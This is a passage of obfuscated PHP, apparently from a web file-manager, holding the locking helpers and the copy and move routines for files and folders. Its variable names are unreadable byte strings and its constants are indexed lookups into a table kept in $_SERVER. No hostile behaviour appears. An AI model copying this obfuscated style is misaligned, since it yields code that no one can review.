$this->_lockEvent($‚‰’Ñîğ, array($ğ»Ö»Š¢[619], $ğ»Ö»Š¢[620]), $ıŸ¦àË­); $this->_lockParent($‚‰’Ñîğ, array($ğ»Ö»Š¢[620]), $ıŸ¦àË­); $this->_lockEvent($‚‰’Ñîğ, array($ğ»Ö»Š¢[621], $ğ»Ö»Š¢[622]), $ıŸ¦àË­); $this->_lockCheckEnd($ğ»Ö»Š¢[618], $‚‰’Ñîğ); } public function lockCopyEnd($”„ã°§¶) { $åÒïå™ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $½ö‡åÑ° = 0; $this->_lockEvent($”„ã°§¶, array($åÒïå™[619], $åÒïå™[620]), $½ö‡åÑ°); $this->_lockParent($”„ã°§¶, array($åÒïå™[620]), $½ö‡åÑ°); $this->_lockEvent($”„ã°§¶, array($åÒïå™[621], $åÒïå™[622]), $½ö‡åÑ°); } public function lockWriteStart($¨æ‰œ³, $·º“‹°¤ = '') { $ÁõÅ¶Í‘ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÁõÅ¶Í‘[619], $¨æ‰œ³); $È¸õ„´Ã = 1; $this->_lockKey($ÁõÅ¶Í‘[623] . $¨æ‰œ³ . $ÁõÅ¶Í‘[10] . $·º“‹°¤, $È¸õ„´Ã); $this->_lockEvent($¨æ‰œ³, array($ÁõÅ¶Í‘[618], $ÁõÅ¶Í‘[620]), $È¸õ„´Ã); $this->_lockParent($¨æ‰œ³, array($ÁõÅ¶Í‘[618], $ÁõÅ¶Í‘[620]), $È¸õ„´Ã); $this->_lockCheckEnd($ÁõÅ¶Í‘[619], $¨æ‰œ³); } public function lockWriteEnd($Ğ¶Ã½ƒ, $¤šÛ–ÈÚ = '') { $úÑ²¿å” =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $ÀöÀö° = 0; $this->_lockKey($úÑ²¿å”[623] . $Ğ¶Ã½ƒ . $úÑ²¿å”[10] . $¤šÛ–ÈÚ, $ÀöÀö°); $this->_lockEvent($Ğ¶Ã½ƒ, array($úÑ²¿å”[618], $úÑ²¿å”[620]), $ÀöÀö°); $this->_lockParent($Ğ¶Ã½ƒ, array($úÑ²¿å”[618], $úÑ²¿å”[620]), $ÀöÀö°); } public function lockMoveStart($ïè® Ä¾) { $˜òÁøÈ¯ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($˜òÁøÈ¯[620], $ïè® Ä¾); $÷§±ÉÅä = 1; $this->_lockKey($˜òÁøÈ¯[624] . $ïè® Ä¾, $÷§±ÉÅä); $this->_lockEvent($ïè® Ä¾, array($˜òÁøÈ¯[618], $˜òÁøÈ¯[619]), $÷§±ÉÅä); $this->_lockParent($ïè® Ä¾, array($˜òÁøÈ¯[618], $˜òÁøÈ¯[620]), $÷§±ÉÅä); $this->_lockEvent($ïè® Ä¾, array($˜òÁøÈ¯[625], $˜òÁøÈ¯[621], $˜òÁøÈ¯[622]), $÷§±ÉÅä); $this->_lockCheckEnd($˜òÁøÈ¯[620], $ïè® Ä¾); } public function lockMoveEnd($‘õ¥ÚáÕ) { $´ê™Ùª× =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->allowLock()) { return; } $àü—æğ = 0; $this->_lockKey($´ê™Ùª×[624] . $‘õ¥ÚáÕ, $àü—æğ); $this->_lockEvent($‘õ¥ÚáÕ, array($´ê™Ùª×[618], $´ê™Ùª×[619]), $àü—æğ); $this->_lockParent($‘õ¥ÚáÕ, array($´ê™Ùª×[618], $´ê™Ùª×[620]), $àü—æğ); $this->_lockEvent($‘õ¥ÚáÕ, array($´ê™Ùª×[625], $´ê™Ùª×[621], $´ê™Ùª×[622]), $àü—æğ); } private function _lockCheck($‰•Ä„Î£, $Í İıäÅ) { $˜ÀÒ÷Ã´ =& $_SERVER[‹è™Ü¸Ñ]; $Çø±ŒÁÃ = $this->sourceInfo($Í İıäÅ); $’©“®ë™ = $‰•Ä„Î£ . $˜ÀÒ÷Ã´[10] . $Í İıäÅ; $this->_lockTimeStart[$’©“®ë™] = timeFloat(); if (!is_array($Çø±ŒÁÃ)) { return; } $‚ûÍ‘Ëò = LNG($˜ÀÒ÷Ã´[626]); CacheLock::setErrorMsg($˜ÀÒ÷Ã´[176] . htmlspecialchars($Çø±ŒÁÃ[$˜ÀÒ÷Ã´[32]]) . $˜ÀÒ÷Ã´[178] . $‚ûÍ‘Ëò); $this->_lockKey($’©“®ë™, 1); $this->_lockKey($’©“®ë™, 0); $ç¤‘õ·ğ = array_reverse($this->parentLevelArray($Çø±ŒÁÃ[$˜ÀÒ÷Ã´[584]])); foreach ($ç¤‘õ·ğ as $¿©¬ÆÛ§) { $’©“®ë™ = $‰•Ä„Î£ . $˜ÀÒ÷Ã´[627] . $¿©¬ÆÛ§; if (CacheLock::lockGet($˜ÀÒ÷Ã´[628] . $’©“®ë™)) { $Çø±ŒÁÃ = $this->sourceInfo($¿©¬ÆÛ§); CacheLock::setErrorMsg($˜ÀÒ÷Ã´[176] . htmlspecialchars($Çø±ŒÁÃ[$˜ÀÒ÷Ã´[32]]) . $˜ÀÒ÷Ã´[178] . $‚ûÍ‘Ëò); $this->_lockKey($’©“®ë™, 1); $this->_lockKey($’©“®ë™, 0); } } } private function _lockCheckEnd($•Ã€ˆƒª, $¯Ô¹˜èó) { $¢šîõ¾¹ =& $_SERVER[‹è™Ü¸Ñ]; $ã©Æ¦Ú¡ = $•Ã€ˆƒª . $¢šîõ¾¹[10] . $¯Ô¹˜èó; CacheLock::setErrorMsg($¢šîõ¾¹[454]); if (!isset($this->_lockTimeStart[$ã©Æ¦Ú¡])) { return; } $õˆ§áãè = timeFloat() - $this->_lockTimeStart[$ã©Æ¦Ú¡]; unset($this->_lockTimeStart[$ã©Æ¦Ú¡]); if ($õˆ§áãè > 0.5) { unset(self::$cacheSourceInfo[$¢šîõ¾¹[533] . $¯Ô¹˜èó]); } $¨Ö“İ‚ = $this->sourceInfo($¯Ô¹˜èó); if (!$¨Ö“İ‚) { show_json(LNG($¢šîõ¾¹[108]), !1); } } private function _lockParent($àú—ø÷Š, $”ÌÅ¥‰, $’ˆÕƒÊô) { if (!$this->autoLockSet) { return; } $ş»Èö±´ = $this->sourceInfo($àú—ø÷Š); if (!is_array($ş»Èö±´)) { return; } $˜µåñ€ = array_reverse($this->parentLevelArray($ş»Èö±´[$_SERVER[‹è™Ü¸Ñ][584]])); foreach ($˜µåñ€ as $½«‡±ÇÂ) { $this->_lockEvent($½«‡±ÇÂ, $”ÌÅ¥‰, $’ˆÕƒÊô); } } private function _lockEvent($âŠªÚïß, $Ì­÷÷Ùı, $Åàº¼õÛ) { $‹È½Ã¯É =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->autoLockSet) { return; } foreach ($Ì­÷÷Ùı as $üÙ¸ õ) { $¯‘Î¯Ìı = $üÙ¸ õ . $‹È½Ã¯É[10] . $âŠªÚïß; if ($Åàº¼õÛ && CacheLock::lockGet($‹È½Ã¯É[628] . $¯‘Î¯Ìı)) { continue; } $this->_lockKey($¯‘Î¯Ìı, $Åàº¼õÛ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($õóŸÃÔÕ, $´é¡°•Æ = 1) { $Ş©Ç½½ = $_SERVER[‹è™Ü¸Ñ][628] . md5($õóŸÃÔÕ); if ($´é¡°•Æ) { if (isset(self::$_lockItemArr[$Ş©Ç½½])) { return; } self::$_lockItemArr[$Ş©Ç½½] = 1; CacheLock::lock($Ş©Ç½½, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ş©Ç½½])) { return; } unset(self::$_lockItemArr[$Ş©Ç½½]); CacheLock::unlock($Ş©Ç½½); } } public function isParentOf($€†à“ú–, $¨Û™“¦Ğ) { $‘ï—š… =& $_SERVER[‹è™Ü¸Ñ]; $ªÎ’îÒ  = $this->sourceInfo($€†à“ú–); $òìÉ¹î‘ = $this->sourceInfo($¨Û™“¦Ğ); $ªÖ¶£ìÕ = $ªÎ’îÒ [$‘ï—š…[584]] . $ªÎ’îÒ [$‘ï—š…[193]] . $‘ï—š…[50]; $ï·á •é = $òìÉ¹î‘[$‘ï—š…[584]] . $òìÉ¹î‘[$‘ï—š…[193]] . $‘ï—š…[50]; $ìÍš‚ùÈ = strpos($ï·á •é, $ªÖ¶£ìÕ) === 0; return $ìÍš‚ùÈ; } private $targetIsDelete = 0; public function copy($×‘Şƒ½Û, $½ñÑö™ñ, $šœßÕÉÚ = REPEAT_REPLACE, $Ë£Ø¯² = '') { $ÆÅå®â =& $_SERVER[‹è™Ü¸Ñ]; $õ÷§´ = $this->sourceInfo($×‘Şƒ½Û); $€òÌ®ëÇ = $this->sourceInfo($½ñÑö™ñ); if (!$õ÷§´ || !$€òÌ®ëÇ || $€òÌ®ëÇ[$ÆÅå®â[485]] != $ÆÅå®â[91]) { return !1; } if ($this->isParentOf($×‘Şƒ½Û, $½ñÑö™ñ)) { return !1; } $——³Æ½˜ = $Ë£Ø¯² ? $Ë£Ø¯² : $õ÷§´[$ÆÅå®â[32]]; $this->lockCopyStart($×‘Şƒ½Û); $this->lockWriteStart($½ñÑö™ñ, $——³Æ½˜); $è–Íûğ = array($ÆÅå®â[629] => array(), $ÆÅå®â[630] => array(), $ÆÅå®â[631] => array()); $this->targetIsDelete = intval($õ÷§´[$ÆÅå®â[505]]); $¶È‘Ú’ = $this->fileNameExistAuto($½ñÑö™ñ, $õ÷§´); $Íâ½¿ïÚ = $this->_copy($×‘Şƒ½Û, $½ñÑö™ñ, $šœßÕÉÚ, $è–Íûğ, !0, $Ë£Ø¯²); $this->_childrenListClear(); $this->lockCopyEnd($×‘Şƒ½Û); $this->lockWriteEnd($½ñÑö™ñ, $——³Æ½˜); if ($õ÷§´[$ÆÅå®â[485]] == $ÆÅå®â[91] && $¶È‘Ú’ == $Íâ½¿ïÚ) { $this->folderSizeResetChildren($¶È‘Ú’); } Model($ÆÅå®â[632])->addAll($è–Íûğ[$ÆÅå®â[630]], array(), !0); if ($¶È‘Ú’ != $Íâ½¿ïÚ || $õ÷§´[$ÆÅå®â[485]] == $ÆÅå®â[91]) { Model($ÆÅå®â[633])->eventCopy($Íâ½¿ïÚ); } $this->saveAll($è–Íûğ[$ÆÅå®â[631]]); Model($ÆÅå®â[230])->linkAdd($è–Íûğ[$ÆÅå®â[629]]); $this->folderSizeReset($½ñÑö™ñ); $this->updateModifyTime($½ñÑö™ñ); return $Íâ½¿ïÚ; } private function _copy($ƒİÇˆ‚¥, $ôÛèçñ·, $»Ò•’ñ, &$äÎÎ¨÷¶, $ùÜ¦Û£, $ê±²÷³ = '') { $Â‚ÊçÚœ =& $_SERVER[‹è™Ü¸Ñ]; $“ıöôõ… = $this->sourceInfoCache($ƒİÇˆ‚¥); $€œîÔÛ˜ = $“ıöôõ…[$Â‚ÊçÚœ[485]] == $Â‚ÊçÚœ[91]; $„Â’şé· = $ê±²÷³ ? $ê±²÷³ : $“ıöôõ…[$Â‚ÊçÚœ[32]]; $ĞÁÍÓˆı = $this->fileNameExistAuto($ôÛèçñ·, $“ıöôõ…); if ($ùÜ¦Û£) { $this->_childrenAllMake($ƒİÇˆ‚¥); if ($€œîÔÛ˜ && $ĞÁÍÓˆı) { $this->_childrenAllMake($ĞÁÍÓˆı); } } if (!$ĞÁÍÓˆı) { return $this->_copyCreate($ƒİÇˆ‚¥, $ôÛèçñ·, $„Â’şé·, $äÎÎ¨÷¶); } $˜¬½Ü•“ = $ĞÁÍÓˆı; if ($€œîÔÛ˜) { if ($»Ò•’ñ == REPEAT_RENAME_FOLDER) { $„Â’şé· = $this->fileNameAutoCache($ôÛèçñ·, $„Â’şé·, $»Ò•’ñ, $€œîÔÛ˜); $˜¬½Ü•“ = $this->_copyCreate($ƒİÇˆ‚¥, $ôÛèçñ·, $„Â’şé·, $äÎÎ¨÷¶); } else { $ÒË‚°ıÒ = $this->_childrenList($ƒİÇˆ‚¥); foreach ($ÒË‚°ıÒ as $ä…‘©„¿) { $this->_copy($ä…‘©„¿[$Â‚ÊçÚœ[193]], $ĞÁÍÓˆı, $»Ò•’ñ, $äÎÎ¨÷¶, !1); } } } else { if ($»Ò•’ñ == REPEAT_RENAME || $»Ò•’ñ == REPEAT_RENAME_FOLDER) { $„Â’şé· = $this->fileNameAutoCache($ôÛèçñ·, $„Â’şé·, $»Ò•’ñ, $€œîÔÛ˜); $˜¬½Ü•“ = $this->_copyCreate($ƒİÇˆ‚¥, $ôÛèçñ·, $„Â’şé·, $äÎÎ¨÷¶); } else { if ($»Ò•’ñ == REPEAT_REPLACE) { $Ğé´¤ìˆ = $this->sourceInfoCache($ĞÁÍÓˆı); $Ä“Æ·¤€ = $this->fileHistory($Ğé´¤ìˆ, $“ıöôõ…[$Â‚ÊçÚœ[541]], $“ıöôõ…[$Â‚ÊçÚœ[79]]); if ($Ä“Æ·¤€) { $äÎÎ¨÷¶[$Â‚ÊçÚœ[629]][] = $“ıöôõ…[$Â‚ÊçÚœ[541]]; } } else { if ($»Ò•’ñ == REPEAT_SKIP) { } } } Hook::trigger($Â‚ÊçÚœ[634], array($Â‚ÊçÚœ[635], $“ıöôõ…, 0)); } return $˜¬½Ü•“; } private function _copyCreate($³ÄØÇ¯î, $öØ²â‹, $˜íÌ¶­©, &$úÓì¿ÔÌ) { $°íÒÄ€ =& $_SERVER[‹è™Ü¸Ñ]; $ÚÄüüƒè = $this->sourceInfoCache($³ÄØÇ¯î); $’”àÚ†™ = $this->sourceInfoCache($öØ²â‹); $É¶¬¬æ¼ = $this->_makeItemData($ÚÄüüƒè, $’”àÚ†™, $˜íÌ¶­©); Hook::trigger($°íÒÄ€[636], $É¶¬¬æ¼); Hook::trigger($°íÒÄ€[637], array($°íÒÄ€[638], $É¶¬¬æ¼, 0)); $”Èû’ÕŠ = $this->add($É¶¬¬æ¼); $¸áÓËãÔ = array($°íÒÄ€[193] => $”Èû’ÕŠ, $°íÒÄ€[32] => $˜íÌ¶­©); $this->_copyApplyMeta($¸áÓËãÔ, $úÓì¿ÔÌ); if ($ÚÄüüƒè[$°íÒÄ€[485]] != $°íÒÄ€[91]) { $úÓì¿ÔÌ[$°íÒÄ€[629]][] = $ÚÄüüƒè[$°íÒÄ€[541]]; return $”Èû’ÕŠ; } $¦õ€ßÈî = array(); $Â”İıâ§ = array(); $this->_childrenListAll($³ÄØÇ¯î, $¦õ€ßÈî); $Ú´ãäíå = count($¦õ€ßÈî); if ($Ú´ãäíå == 0) { return $”Èû’ÕŠ; } $æœÚÁºê = $this->sourceInfo($”Èû’ÕŠ); foreach ($¦õ€ßÈî as $Œ¤ ®ï®) { $ôƒŒ›é‰ = $this->_makeItemData($Œ¤ ®ï®, $æœÚÁºê, $Œ¤ ®ï®[$°íÒÄ€[32]]); $ôƒŒ›é‰[$°íÒÄ€[584]] = $Œ¤ ®ï®[$°íÒÄ€[584]]; $Â”İıâ§[] = $ôƒŒ›é‰; } $this->chunkEventSet($°íÒÄ€[639], array($°íÒÄ€[640], $É¶¬¬æ¼, $Ú´ãäíå)); $this->addAll($Â”İıâ§, array(), !1); $ì©î×õ = $this->where(array($°íÒÄ€[192] => $”Èû’ÕŠ))->select(); $±Š¾…¨• = $this->_childrenMakeRelation($¦õ€ßÈî, $ì©î×õ); $±Š¾…¨•[$³ÄØÇ¯î] = $”Èû’ÕŠ; $ûÕ»Ş«’ = array(); $ï·¼¤¿• = array(); foreach ($ì©î×õ as $Œ¤ ®ï®) { $Ùµ²‰î± = $Œ¤ ®ï®[$°íÒÄ€[193]]; $’½³Çåµ = $this->_childrenMatch($±Š¾…¨•, $Œ¤ ®ï®, $æœÚÁºê); $ûÕ»Ş«’[] = array($°íÒÄ€[193], $Ùµ²‰î±, $°íÒÄ€[192], $’½³Çåµ[$°íÒÄ€[192]]); $ï·¼¤¿•[] = array($°íÒÄ€[193], $Ùµ²‰î±, $°íÒÄ€[584], $’½³Çåµ[$°íÒÄ€[584]]); $this->_copyApplyMeta($Œ¤ ®ï®, $úÓì¿ÔÌ); if ($Œ¤ ®ï®[$°íÒÄ€[485]] != $°íÒÄ€[91]) { $úÓì¿ÔÌ[$°íÒÄ€[629]][] = $Œ¤ ®ï®[$°íÒÄ€[541]]; } } $this->chunkEventSet($°íÒÄ€[641], array($°íÒÄ€[642], $É¶¬¬æ¼, $Ú´ãäíå)); $this->saveAll($ûÕ»Ş«’); $this->chunkEventSet($°íÒÄ€[643], array($°íÒÄ€[644], $É¶¬¬æ¼, $Ú´ãäíå)); $this->saveAll($ï·¼¤¿•); return $”Èû’ÕŠ; } private function _childrenMakeRelation($óî›ô¡É, $û¨Î÷Ø²) { $ÙäƒÑÖ =& $_SERVER[‹è™Ü¸Ñ]; $±óÀ‘á¯ = array(); $´‘Åäë¯ = array(); foreach ($óî›ô¡É as $ ¹„—úİ) { $ŸüÄû° = $ ¹„—úİ[$ÙäƒÑÖ[32]] . $ÙäƒÑÖ[8] . $ ¹„—úİ[$ÙäƒÑÖ[584]]; $±óÀ‘á¯[$ŸüÄû°] = $ ¹„—úİ[$ÙäƒÑÖ[193]]; } foreach ($û¨Î÷Ø² as $ ¹„—úİ) { $ŸüÄû° = $ ¹„—úİ[$ÙäƒÑÖ[32]] . $ÙäƒÑÖ[8] . $ ¹„—úİ[$ÙäƒÑÖ[584]]; $…à½ÈŞ = $±óÀ‘á¯[$ŸüÄû°]; $´‘Åäë¯[$…à½ÈŞ] = $ ¹„—úİ[$ÙäƒÑÖ[193]]; } return $´‘Åäë¯; } private function _childrenMatch($Ü—ˆóÄ‰, $õ´«âÂÒ, $ô®…ı¶¾) { $¬ÀŠ£¡Ö =& $_SERVER[‹è™Ü¸Ñ]; $¶˜‹É‡ó = $ô®…ı¶¾[$¬ÀŠ£¡Ö[584]]; $Â÷õÈÚ° = $this->parentLevelArray($õ´«âÂÒ[$¬ÀŠ£¡Ö[584]]); foreach ($Â÷õÈÚ° as $ã“µ·¡¤) { if (isset($Ü—ˆóÄ‰[$ã“µ·¡¤])) { $¶˜‹É‡ó .= $Ü—ˆóÄ‰[$ã“µ·¡¤] . $¬ÀŠ£¡Ö[645]; } } $¶˜‹É‡ó = rtrim($¶˜‹É‡ó, $¬ÀŠ£¡Ö[50]) . $¬ÀŠ£¡Ö[50]; $Ö¸°ËÚ = $this->parentLevelArray($¶˜‹É‡ó); $§‚ı¶¯ô = $Ö¸°ËÚ[count($Ö¸°ËÚ) - 1]; return array($¬ÀŠ£¡Ö[192] => $§‚ı¶¯ô, $¬ÀŠ£¡Ö[584] => $¶˜‹É‡ó); } private function _makeItemData($Ü“¨ûÉ, $ˆ¼«ò­, $¡èÂ³æÉ) { $è¢…áôĞ =& $_SERVER[‹è™Ü¸Ñ]; $ ‡€¸éÅ = array($è¢…áôĞ[646] => $Ü“¨ûÉ[$è¢…áôĞ[485]], $è¢…áôĞ[494] => $¡èÂ³æÉ, $è¢…áôĞ[647] => $Ü“¨ûÉ[$è¢…áôĞ[486]] ? $Ü“¨ûÉ[$è¢…áôĞ[486]] : $è¢…áôĞ[12], $è¢…áôĞ[542] => $Ü“¨ûÉ[$è¢…áôĞ[541]] ? $Ü“¨ûÉ[$è¢…áôĞ[541]] : 0, $è¢…áôĞ[617] => $Ü“¨ûÉ[$è¢…áôĞ[79]] ? $Ü“¨ûÉ[$è¢…áôĞ[79]] : 0, $è¢…áôĞ[648] => intval($ˆ¼«ò­[$è¢…áôĞ[190]]), $è¢…áôĞ[649] => intval($ˆ¼«ò­[$è¢…áôĞ[569]]), $è¢…áôĞ[650] => intval(USER_ID), $è¢…áôĞ[651] => intval(USER_ID), $è¢…áôĞ[477] => intval($ˆ¼«ò­[$è¢…áôĞ[193]]), $è¢…áôĞ[652] => $ˆ¼«ò­[$è¢…áôĞ[584]] . $ˆ¼«ò­[$è¢…áôĞ[193]] . $è¢…áôĞ[50], $è¢…áôĞ[498] => $Ü“¨ûÉ[$è¢…áôĞ[88]] ? $Ü“¨ûÉ[$è¢…áôĞ[88]] : time(), $è¢…áôĞ[504] => 0, $è¢…áôĞ[653] => $è¢…áôĞ[12]); return $ ‡€¸éÅ; } private function _copyApplyMeta($Ê‰îöØ¯, &$—‡·»Öî) { $àˆİœˆ³ =& $_SERVER[‹è™Ü¸Ñ]; $î§¡•ß­ = $Ê‰îöØ¯[$àˆİœˆ³[193]]; $î–øÍÑÄ = $Ê‰îöØ¯[$àˆİœˆ³[32]]; if (!isset($Ê‰îöØ¯[$àˆİœˆ³[654]]) || !$Ê‰îöØ¯[$àˆİœˆ³[654]] || $Ê‰îöØ¯[$àˆİœˆ³[654]] == $àˆİœˆ³[228]) { $—‡·»Öî[$àˆİœˆ³[631]][] = array($àˆİœˆ³[193], $î§¡•ß­, $àˆİœˆ³[654], short_id($î§¡•ß­)); } if (Input::check($î–øÍÑÄ, $àˆİœˆ³[655])) { $—‡·»Öî[$àˆİœˆ³[630]][] = array($àˆİœˆ³[193] => $î§¡•ß­, $àˆİœˆ³[97] => $àˆİœˆ³[538], $àˆİœˆ³[450] => str_replace($àˆİœˆ³[53], $àˆİœˆ³[12], Pinyin::get($î–øÍÑÄ))); $—‡·»Öî[$àˆİœˆ³[630]][] = array($àˆİœˆ³[193] => $î§¡•ß­, $àˆİœˆ³[97] => $àˆİœˆ³[537], $àˆİœˆ³[450] => Pinyin::get($î–øÍÑÄ, $àˆİœˆ³[656])); } $—‡·»Öî[$àˆİœˆ³[630]][] = array($àˆİœˆ³[193] => $î§¡•ß­, $àˆİœˆ³[97] => $àˆİœˆ³[517], $àˆİœˆ³[450] => KodSort::makeStr($î–øÍÑÄ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($±õ¤Œˆ») { $Ÿö”õâú =& $_SERVER[‹è™Ü¸Ñ]; $†©ş§² = $this->sourceInfo($±õ¤Œˆ»); $ØãÃ¬æì = $Ÿö”õâú[657]; $ß®½§Œì = array($Ÿö”õâú[584] => array($Ÿö”õâú[612], $†©ş§²[$Ÿö”õâú[584]] . $±õ¤Œˆ» . $Ÿö”õâú[613]), $Ÿö”õâú[505] => $this->targetIsDelete); $°ˆô•ëç = $this->field($ØãÃ¬æì)->where($ß®½§Œì)->select(); if (!$°ˆô•ëç) { return; } $°ˆô•ëç = array_to_keyvalue($°ˆô•ëç, $Ÿö”õâú[193]); foreach ($°ˆô•ëç as $óÑ’¤ŠÃ) { $¤Ä²§º’ = $óÑ’¤ŠÃ[$Ÿö”õâú[192]]; $±õ¤Œˆ» = $óÑ’¤ŠÃ[$Ÿö”õâú[193]]; if (!isset($this->_childrenListCache[$±õ¤Œˆ»]) && $óÑ’¤ŠÃ[$Ÿö”õâú[485]] == $Ÿö”õâú[91]) { $this->_childrenListCache[$±õ¤Œˆ»] = array(); } if (!isset($this->_childrenListCache[$¤Ä²§º’])) { $this->_childrenListCache[$¤Ä²§º’] = array(); } $this->_childrenListCache[$¤Ä²§º’][$±õ¤Œˆ»] = $óÑ’¤ŠÃ; $this->_childrenItemCache[$±õ¤Œˆ»] = $óÑ’¤ŠÃ; } } private function _childrenListAll($‰›´ô•ô, &$ŒÄõÚ¦ş) { $ãûÒ”Ûø =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->_childrenListCache[$‰›´ô•ô])) { return; } $…ŞÎ˜Û° = $this->_childrenListCache[$‰›´ô•ô]; foreach ($…ŞÎ˜Û° as $¢‰¡¨ï => $é‰æİ†É) { $ŒÄõÚ¦ş[$¢‰¡¨ï] = $é‰æİ†É; if ($é‰æİ†É[$ãûÒ”Ûø[485]] == $ãûÒ”Ûø[91]) { $this->_childrenListAll($¢‰¡¨ï, $ŒÄõÚ¦ş); } } } private function sourceInfoCache($ÖÁ°§¾Â) { if (isset($this->_childrenItemCache[$ÖÁ°§¾Â])) { return $this->_childrenItemCache[$ÖÁ°§¾Â]; } return $this->sourceInfo($ÖÁ°§¾Â); } private function _childrenList($§‚»¹Ëé) { if (isset($this->_childrenListCache[$§‚»¹Ëé])) { return $this->_childrenListCache[$§‚»¹Ëé]; } return $this->_childrenListSelect($§‚»¹Ëé); } private function _childrenListSelect($ÄÉÕ„Û) { $«˜ĞÊæ =& $_SERVER[‹è™Ü¸Ñ]; $›„şÃ±ö = array($«˜ĞÊæ[192] => $ÄÉÕ„Û, $«˜ĞÊæ[505] => $this->targetIsDelete); $³·“†¯ = $this->where($›„şÃ±ö)->select(); $³·“†¯ = $³·“†¯ ? $³·“†¯ : array(); $‚Û“—» = array_to_keyvalue($³·“†¯, $«˜ĞÊæ[193]); $this->_childrenListCache[$ÄÉÕ„Û] = $‚Û“—»; foreach ($‚Û“—» as $ÄÉÕ„Û => $ÉœÇ²ˆ€) { $this->_childrenItemCache[$ÄÉÕ„Û] = $ÉœÇ²ˆ€; } return $‚Û“—»; } private function fileNameExistAuto($­ ºâ½, $“Ú°ÕËş) { $ÜÕÕİ­– =& $_SERVER[‹è™Ü¸Ñ]; if ($“Ú°ÕËş[$ÜÕÕİ­–[505]] == $ÜÕÕİ­–[91]) { return $this->fileNameExist($­ ºâ½, $“Ú°ÕËş[$ÜÕÕİ­–[32]]); } return $this->fileNameExistCache($­ ºâ½, $“Ú°ÕËş[$ÜÕÕİ­–[32]]); } private function fileNameExistCache($’¢…ôÖ÷, $Ì¶—µÒÖ) { $¼áéâƒê =& $_SERVER[‹è™Ü¸Ñ]; $Ì¶—µÒÖ = strtolower($Ì¶—µÒÖ); $ˆİõÂï = $this->_childrenList($’¢…ôÖ÷); foreach ($ˆİõÂï as $ö‹Ò±¢Ä) { if ($Ì¶—µÒÖ == strtolower($ö‹Ò±¢Ä[$¼áéâƒê[32]])) { return $ö‹Ò±¢Ä[$¼áéâƒê[193]]; } } return !1; } private function fileNameAutoCache($ÚßÇÔĞ«, $ëî™¯ , $¿ªÌº¼Ù, $Óßƒóé) { $—³Ö‹§¾ =& $_SERVER[‹è™Ü¸Ñ]; $ÅâÜ¶† = $this->_childrenList($ÚßÇÔĞ«); $—‘¬çûÑ = array_to_keyvalue($ÅâÜ¶†, $—³Ö‹§¾[12], $—³Ö‹§¾[32]); return $this->fileNameAutoGet($—‘¬çûÑ, $ëî™¯ , $¿ªÌº¼Ù, $Óßƒóé); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($·Ì½Ò£€, $™Ö»­ã¾, $„¬å˜û = REPEAT_REPLACE, $Š’¶–˜– = '') { $‚Ù¾ªí¶ =& $_SERVER[‹è™Ü¸Ñ]; $ÑøèŠî˜ = $this->sourceInfo($·Ì½Ò£€); $Ú·¿Ö—® = $this->sourceInfo($™Ö»­ã¾); if ($ÑøèŠî˜[$‚Ù¾ªí¶[192]] == $Ú·¿Ö—®[$‚Ù¾ªí¶[193]]) { if ($ÑøèŠî˜[$‚Ù¾ªí¶[505]] == $‚Ù¾ªí¶[91]) { Model($‚Ù¾ªí¶[503])->restore(array($·Ì½Ò£€)); } if (!$Š’¶–˜– || $Š’¶–˜– == $ÑøèŠî˜[$‚Ù¾ªí¶[32]]) { return $·Ì½Ò£€; } } $Ø¤ïÌµ” = $this->pathInfoMore($·Ì½Ò£€); if ($this->isParentOf($·Ì½Ò£€, $™Ö»­ã¾)) { return !1; } if (!$ÑøèŠî˜ || !$Ú·¿Ö—® || $Ú·¿Ö—®[$‚Ù¾ªí¶[485]] != $‚Ù¾ªí¶[91]) { return !1; } Hook::trigger($‚Ù¾ªí¶[658], $Ø¤ïÌµ”); $this->targetIsDelete = intval($ÑøèŠî˜[$‚Ù¾ªí¶[505]]); if ($ÑøèŠî˜[$‚Ù¾ªí¶[192]] == $™Ö»­ã¾ && $Š’¶–˜– != $ÑøèŠî˜[$‚Ù¾ªí¶[32]]) { $õ÷Øñ§º = $this->fileNameExist($™Ö»­ã¾, $Š’¶–˜–); if ($õ÷Øñ§º && $ÑøèŠî˜[$‚Ù¾ªí¶[485]] == $‚Ù¾ªí¶[228]) { $‰ÖÃğ° = $this->sourceInfo($õ÷Øñ§º); $™´¥·œó = $this->fileHistory($‰ÖÃğ°, $ÑøèŠî˜[$‚Ù¾ªí¶[541]], $ÑøèŠî˜[$‚Ù¾ªí¶[79]]); if (!$™´¥·œó) { Model($‚Ù¾ªí¶[544])->remove($ÑøèŠî˜[$‚Ù¾ªí¶[541]]); } $this->removeNow($·Ì½Ò£€, !1); $this->folderSizeReset($™Ö»­ã¾); Hook::trigger($‚Ù¾ªí¶[659], $Ø¤ïÌµ”); return $õ÷Øñ§º; } } $’…‡ ¥ = $Š’¶–˜– ? $Š’¶–˜– : $ÑøèŠî˜[$‚Ù¾ªí¶[32]]; $this->lockMoveStart($·Ì½Ò£€); $this->lockWriteStart($™Ö»­ã¾, $’…‡ ¥); $«Üá›¼ = array($‚Ù¾ªí¶[629] => array(), $‚Ù¾ªí¶[660] => !1); $this->clearShare($·Ì½Ò£€, $™Ö»­ã¾); $¿ô™²ù… = $this->fileNameExistAuto($™Ö»­ã¾, $ÑøèŠî˜); $Ÿ“§ = $this->_move($·Ì½Ò£€, $™Ö»­ã¾, $„¬å˜û, $«Üá›¼, $Š’¶–˜–); $this->sourceCacheClear(); if ($ÑøèŠî˜[$‚Ù¾ªí¶[485]] == $‚Ù¾ªí¶[91] && $¿ô™²ù…) { $this->folderSizeResetChildren($Ÿ“§); } Model($‚Ù¾ªí¶[230])->linkAdd($«Üá›¼[$‚Ù¾ªí¶[629]]); if ($¿ô™²ù… && $«Üá›¼[$‚Ù¾ªí¶[660]]) { $this->removeNow($·Ì½Ò£€, !1); } $this->lockMoveEnd($·Ì½Ò£€); 